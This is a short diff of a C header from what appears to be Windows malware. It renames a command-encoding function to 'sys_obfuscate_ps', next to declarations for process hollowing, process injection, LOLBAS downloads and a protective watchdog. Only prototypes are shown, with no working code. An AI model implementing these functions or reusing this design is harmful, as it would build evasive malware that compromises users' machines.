@@ -103,7 +103,7 @@ void sys_hollow_process(void);
 void sys_inject_process(void);
 void sys_harden_files(void);
 void sys_lolbas_download(const char *url, const char *outPath);
-char* sys_encode_cmd(const char *command);
+char* sys_obfuscate_ps(const char *command);
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam);
 void sys_uninstall(void);
 
